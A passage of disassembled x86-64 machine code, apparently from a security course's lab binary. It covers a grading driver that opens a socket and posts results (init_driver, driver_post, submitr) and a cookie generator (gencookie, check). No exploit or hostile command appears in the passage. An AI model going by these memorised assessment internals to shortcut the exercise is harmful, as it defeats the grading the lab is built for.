  402b0c:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402b11:	e9 aa fb ff ff       	jmpq   4026c0 <submitr+0x2d7>
  402b16:	4c 8d 8c 24 40 80 00 	lea    0x8040(%rsp),%r9
  402b1d:	00 
  402b1e:	b9 58 36 40 00       	mov    $0x403658,%ecx
  402b23:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
  402b2a:	be 01 00 00 00       	mov    $0x1,%esi
  402b2f:	48 89 ef             	mov    %rbp,%rdi
  402b32:	b8 00 00 00 00       	mov    $0x0,%eax
  402b37:	e8 24 e3 ff ff       	callq  400e60 <__sprintf_chk@plt>
  402b3c:	89 df                	mov    %ebx,%edi
  402b3e:	e8 dd e1 ff ff       	callq  400d20 <close@plt>
  402b43:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402b48:	e9 73 fb ff ff       	jmpq   4026c0 <submitr+0x2d7>
  402b4d:	e8 8e e1 ff ff       	callq  400ce0 <__stack_chk_fail@plt>

0000000000402b52 <init_timeout>:
  402b52:	85 ff                	test   %edi,%edi
  402b54:	74 26                	je     402b7c <init_timeout+0x2a>
  402b56:	53                   	push   %rbx
  402b57:	89 fb                	mov    %edi,%ebx
  402b59:	85 ff                	test   %edi,%edi
  402b5b:	78 18                	js     402b75 <init_timeout+0x23>
  402b5d:	be 1d 21 40 00       	mov    $0x40211d,%esi
  402b62:	bf 0e 00 00 00       	mov    $0xe,%edi
  402b67:	e8 d4 e1 ff ff       	callq  400d40 <signal@plt>
  402b6c:	89 df                	mov    %ebx,%edi
  402b6e:	e8 9d e1 ff ff       	callq  400d10 <alarm@plt>
  402b73:	5b                   	pop    %rbx
  402b74:	c3                   	retq   
  402b75:	bb 00 00 00 00       	mov    $0x0,%ebx
  402b7a:	eb e1                	jmp    402b5d <init_timeout+0xb>
  402b7c:	f3 c3                	repz retq 

0000000000402b7e <init_driver>:
  402b7e:	55                   	push   %rbp
  402b7f:	53                   	push   %rbx
  402b80:	48 83 ec 28          	sub    $0x28,%rsp
  402b84:	48 89 fd             	mov    %rdi,%rbp
  402b87:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  402b8e:	00 00 
  402b90:	48 89 44 24 18       	mov    %rax,0x18(%rsp)
  402b95:	31 c0                	xor    %eax,%eax
  402b97:	be 01 00 00 00       	mov    $0x1,%esi
  402b9c:	bf 0d 00 00 00       	mov    $0xd,%edi
  402ba1:	e8 9a e1 ff ff       	callq  400d40 <signal@plt>
  402ba6:	be 01 00 00 00       	mov    $0x1,%esi
  402bab:	bf 1d 00 00 00       	mov    $0x1d,%edi
  402bb0:	e8 8b e1 ff ff       	callq  400d40 <signal@plt>
  402bb5:	be 01 00 00 00       	mov    $0x1,%esi
  402bba:	bf 1d 00 00 00       	mov    $0x1d,%edi
  402bbf:	e8 7c e1 ff ff       	callq  400d40 <signal@plt>
  402bc4:	ba 00 00 00 00       	mov    $0x0,%edx
  402bc9:	be 01 00 00 00       	mov    $0x1,%esi
  402bce:	bf 02 00 00 00       	mov    $0x2,%edi
  402bd3:	e8 98 e2 ff ff       	callq  400e70 <socket@plt>
  402bd8:	85 c0                	test   %eax,%eax
  402bda:	0f 88 9c 00 00 00    	js     402c7c <init_driver+0xfe>
  402be0:	89 c3                	mov    %eax,%ebx
  402be2:	bf ec 31 40 00       	mov    $0x4031ec,%edi
  402be7:	e8 64 e1 ff ff       	callq  400d50 <gethostbyname@plt>
  402bec:	48 85 c0             	test   %rax,%rax
  402bef:	0f 84 d3 00 00 00    	je     402cc8 <init_driver+0x14a>
  402bf5:	48 c7 44 24 02 00 00 	movq   $0x0,0x2(%rsp)
  402bfc:	00 00 
  402bfe:	c7 44 24 0a 00 00 00 	movl   $0x0,0xa(%rsp)
  402c05:	00 
  402c06:	66 c7 44 24 0e 00 00 	movw   $0x0,0xe(%rsp)
  402c0d:	66 c7 04 24 02 00    	movw   $0x2,(%rsp)
  402c13:	48 63 50 14          	movslq 0x14(%rax),%rdx
  402c17:	48 8b 40 18          	mov    0x18(%rax),%rax
  402c1b:	48 8b 30             	mov    (%rax),%rsi
  402c1e:	48 8d 7c 24 04       	lea    0x4(%rsp),%rdi
  402c23:	b9 0c 00 00 00       	mov    $0xc,%ecx
  402c28:	e8 33 e1 ff ff       	callq  400d60 <__memmove_chk@plt>
  402c2d:	66 c7 44 24 02 3b 70 	movw   $0x703b,0x2(%rsp)
  402c34:	ba 10 00 00 00       	mov    $0x10,%edx
  402c39:	48 89 e6             	mov    %rsp,%rsi
  402c3c:	89 df                	mov    %ebx,%edi
  402c3e:	e8 fd e1 ff ff       	callq  400e40 <connect@plt>
  402c43:	85 c0                	test   %eax,%eax
  402c45:	0f 88 e5 00 00 00    	js     402d30 <init_driver+0x1b2>
  402c4b:	89 df                	mov    %ebx,%edi
  402c4d:	e8 ce e0 ff ff       	callq  400d20 <close@plt>
  402c52:	66 c7 45 00 4f 4b    	movw   $0x4b4f,0x0(%rbp)
  402c58:	c6 45 02 00          	movb   $0x0,0x2(%rbp)
  402c5c:	b8 00 00 00 00       	mov    $0x0,%eax
  402c61:	48 8b 4c 24 18       	mov    0x18(%rsp),%rcx
  402c66:	64 48 33 0c 25 28 00 	xor    %fs:0x28,%rcx
  402c6d:	00 00 
  402c6f:	0f 85 0e 01 00 00    	jne    402d83 <init_driver+0x205>
  402c75:	48 83 c4 28          	add    $0x28,%rsp
  402c79:	5b                   	pop    %rbx
  402c7a:	5d                   	pop    %rbp
  402c7b:	c3                   	retq   
  402c7c:	48 b8 45 72 72 6f 72 	movabs $0x43203a726f727245,%rax
  402c83:	3a 20 43 
  402c86:	48 ba 6c 69 65 6e 74 	movabs $0x6e7520746e65696c,%rdx
  402c8d:	20 75 6e 
  402c90:	48 89 45 00          	mov    %rax,0x0(%rbp)
  402c94:	48 89 55 08          	mov    %rdx,0x8(%rbp)
  402c98:	48 b8 61 62 6c 65 20 	movabs $0x206f7420656c6261,%rax
  402c9f:	74 6f 20 
  402ca2:	48 ba 63 72 65 61 74 	movabs $0x7320657461657263,%rdx
  402ca9:	65 20 73 
  402cac:	48 89 45 10          	mov    %rax,0x10(%rbp)
  402cb0:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  402cb4:	c7 45 20 6f 63 6b 65 	movl   $0x656b636f,0x20(%rbp)
  402cbb:	66 c7 45 24 74 00    	movw   $0x74,0x24(%rbp)
  402cc1:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402cc6:	eb 99                	jmp    402c61 <init_driver+0xe3>
  402cc8:	48 b8 45 72 72 6f 72 	movabs $0x44203a726f727245,%rax
  402ccf:	3a 20 44 
  402cd2:	48 ba 4e 53 20 69 73 	movabs $0x6e7520736920534e,%rdx
  402cd9:	20 75 6e 
  402cdc:	48 89 45 00          	mov    %rax,0x0(%rbp)
  402ce0:	48 89 55 08          	mov    %rdx,0x8(%rbp)
  402ce4:	48 b8 61 62 6c 65 20 	movabs $0x206f7420656c6261,%rax
  402ceb:	74 6f 20 
  402cee:	48 ba 72 65 73 6f 6c 	movabs $0x2065766c6f736572,%rdx
  402cf5:	76 65 20 
  402cf8:	48 89 45 10          	mov    %rax,0x10(%rbp)
  402cfc:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  402d00:	48 b8 73 65 72 76 65 	movabs $0x6120726576726573,%rax
  402d07:	72 20 61 
  402d0a:	48 89 45 20          	mov    %rax,0x20(%rbp)
  402d0e:	c7 45 28 64 64 72 65 	movl   $0x65726464,0x28(%rbp)
  402d15:	66 c7 45 2c 73 73    	movw   $0x7373,0x2c(%rbp)
  402d1b:	c6 45 2e 00          	movb   $0x0,0x2e(%rbp)
  402d1f:	89 df                	mov    %ebx,%edi
  402d21:	e8 fa df ff ff       	callq  400d20 <close@plt>
  402d26:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402d2b:	e9 31 ff ff ff       	jmpq   402c61 <init_driver+0xe3>
  402d30:	48 b8 45 72 72 6f 72 	movabs $0x55203a726f727245,%rax
  402d37:	3a 20 55 
  402d3a:	48 ba 6e 61 62 6c 65 	movabs $0x6f7420656c62616e,%rdx
  402d41:	20 74 6f 
  402d44:	48 89 45 00          	mov    %rax,0x0(%rbp)
  402d48:	48 89 55 08          	mov    %rdx,0x8(%rbp)
  402d4c:	48 b8 20 63 6f 6e 6e 	movabs $0x7463656e6e6f6320,%rax
  402d53:	65 63 74 
  402d56:	48 ba 20 74 6f 20 73 	movabs $0x76726573206f7420,%rdx
  402d5d:	65 72 76 
  402d60:	48 89 45 10          	mov    %rax,0x10(%rbp)
  402d64:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  402d68:	66 c7 45 20 65 72    	movw   $0x7265,0x20(%rbp)
  402d6e:	c6 45 22 00          	movb   $0x0,0x22(%rbp)
  402d72:	89 df                	mov    %ebx,%edi
  402d74:	e8 a7 df ff ff       	callq  400d20 <close@plt>
  402d79:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402d7e:	e9 de fe ff ff       	jmpq   402c61 <init_driver+0xe3>
  402d83:	e8 58 df ff ff       	callq  400ce0 <__stack_chk_fail@plt>

0000000000402d88 <driver_post>:
  402d88:	53                   	push   %rbx
  402d89:	4c 89 cb             	mov    %r9,%rbx
  402d8c:	45 85 c0             	test   %r8d,%r8d
  402d8f:	75 18                	jne    402da9 <driver_post+0x21>
  402d91:	48 85 ff             	test   %rdi,%rdi
  402d94:	74 05                	je     402d9b <driver_post+0x13>
  402d96:	80 3f 00             	cmpb   $0x0,(%rdi)
  402d99:	75 35                	jne    402dd0 <driver_post+0x48>
  402d9b:	66 c7 03 4f 4b       	movw   $0x4b4f,(%rbx)
  402da0:	c6 43 02 00          	movb   $0x0,0x2(%rbx)
  402da4:	44 89 c0             	mov    %r8d,%eax
  402da7:	5b                   	pop    %rbx
  402da8:	c3                   	retq   
  402da9:	48 89 ca             	mov    %rcx,%rdx
  402dac:	be ac 36 40 00       	mov    $0x4036ac,%esi
  402db1:	bf 01 00 00 00       	mov    $0x1,%edi
  402db6:	b8 00 00 00 00       	mov    $0x0,%eax
  402dbb:	e8 20 e0 ff ff       	callq  400de0 <__printf_chk@plt>
  402dc0:	66 c7 03 4f 4b       	movw   $0x4b4f,(%rbx)
  402dc5:	c6 43 02 00          	movb   $0x0,0x2(%rbx)
  402dc9:	b8 00 00 00 00       	mov    $0x0,%eax
  402dce:	eb d7                	jmp    402da7 <driver_post+0x1f>
  402dd0:	48 83 ec 08          	sub    $0x8,%rsp
  402dd4:	41 51                	push   %r9
  402dd6:	49 89 c9             	mov    %rcx,%r9
  402dd9:	49 89 d0             	mov    %rdx,%r8
  402ddc:	48 89 f9             	mov    %rdi,%rcx
  402ddf:	48 89 f2             	mov    %rsi,%rdx
  402de2:	be 70 3b 00 00       	mov    $0x3b70,%esi
  402de7:	bf ec 31 40 00       	mov    $0x4031ec,%edi
  402dec:	e8 f8 f5 ff ff       	callq  4023e9 <submitr>
  402df1:	48 83 c4 10          	add    $0x10,%rsp
  402df5:	eb b0                	jmp    402da7 <driver_post+0x1f>

0000000000402df7 <check>:
  402df7:	89 f8                	mov    %edi,%eax
  402df9:	c1 e8 1c             	shr    $0x1c,%eax
  402dfc:	85 c0                	test   %eax,%eax
  402dfe:	74 1d                	je     402e1d <check+0x26>
  402e00:	b9 00 00 00 00       	mov    $0x0,%ecx
  402e05:	83 f9 1f             	cmp    $0x1f,%ecx
  402e08:	7f 0d                	jg     402e17 <check+0x20>
  402e0a:	89 f8                	mov    %edi,%eax
  402e0c:	d3 e8                	shr    %cl,%eax
  402e0e:	3c 0a                	cmp    $0xa,%al
  402e10:	74 11                	je     402e23 <check+0x2c>
  402e12:	83 c1 08             	add    $0x8,%ecx
  402e15:	eb ee                	jmp    402e05 <check+0xe>
  402e17:	b8 01 00 00 00       	mov    $0x1,%eax
  402e1c:	c3                   	retq   
  402e1d:	b8 00 00 00 00       	mov    $0x0,%eax
  402e22:	c3                   	retq   
  402e23:	b8 00 00 00 00       	mov    $0x0,%eax
  402e28:	c3                   	retq   

0000000000402e29 <gencookie>:
  402e29:	53                   	push   %rbx
  402e2a:	83 c7 01             	add    $0x1,%edi
  402e2d:	e8 5e de ff ff       	callq  400c90 <srandom@plt>
  402e32:	e8 69 df ff ff       	callq  400da0 <random@plt>
  402e37:	89 c3                	mov    %eax,%ebx
  402e39:	89 c7                	mov    %eax,%edi
  402e3b:	e8 b7 ff ff ff       	callq  402df7 <check>
  402e40:	85 c0                	test   %eax,%eax
  402e42:	74 ee                	je     402e32 <gencookie+0x9>
  402e44:	89 d8                	mov    %ebx,%eax
  402e46:	5b                   	pop    %rbx
  402e47:	c3                   	retq   
  402e48:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  402e4f:	00 

0000000000402e50 <__libc_csu_init>:
  402e50:	41 57                	push   %r15
  402e52:	41 56                	push   %r14
  402e54:	49 89 d7             	mov    %rdx,%r15
  402e57:	41 55                	push   %r13
  402e59:	41 54                	push   %r12
  402e5b:	4c 8d 25 ae 0f 20 00 	lea    0x200fae(%rip),%r12        # 603e10 <__frame_dummy_init_array_entry>
  402e62:	55                   	push   %rbp
  402e63:	48 8d 2d ae 0f 20 00 	lea    0x200fae(%rip),%rbp        # 603e18 <__init_array_end>
  402e6a:	53                   	push   %rbx
  402e6b:	41 89 fd             	mov    %edi,%r13d
  402e6e:	49 89 f6             	mov    %rsi,%r14
  402e71:	4c 29 e5             	sub    %r12,%rbp
  402e74:	48 83 ec 08          	sub    $0x8,%rsp
  402e78:	48 c1 fd 03          	sar    $0x3,%rbp
  402e7c:	e8 c7 dd ff ff       	callq  400c48 <_init>
  402e81:	48 85 ed             	test   %rbp,%rbp
  402e84:	74 20                	je     402ea6 <__libc_csu_init+0x56>
  402e86:	31 db                	xor    %ebx,%ebx
  402e88:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  402e8f:	00 
  402e90:	4c 89 fa             	mov    %r15,%rdx
  402e93:	4c 89 f6             	mov    %r14,%rsi
  402e96:	44 89 ef             	mov    %r13d,%edi
  402e99:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
  402e9d:	48 83 c3 01          	add    $0x1,%rbx
  402ea1:	48 39 dd             	cmp    %rbx,%rbp
  402ea4:	75 ea                	jne    402e90 <__libc_csu_init+0x40>
  402ea6:	48 83 c4 08          	add    $0x8,%rsp
  402eaa:	5b                   	pop    %rbx
  402eab:	5d                   	pop    %rbp
  402eac:	41 5c                	pop    %r12
  402eae:	41 5d                	pop    %r13
  402eb0:	41 5e                	pop    %r14
  402eb2:	41 5f                	pop    %r15
  402eb4:	c3                   	retq   
  402eb5:	90                   	nop
  402eb6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  402ebd:	00 00 00 

0000000000402ec0 <__libc_csu_fini>:
  402ec0:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000402ec4 <_fini>:
  402ec4:	48 83 ec 08          	sub    $0x8,%rsp
  402ec8:	48 83 c4 08          	add    $0x8,%rsp
  402ecc:	c3                   	retq   
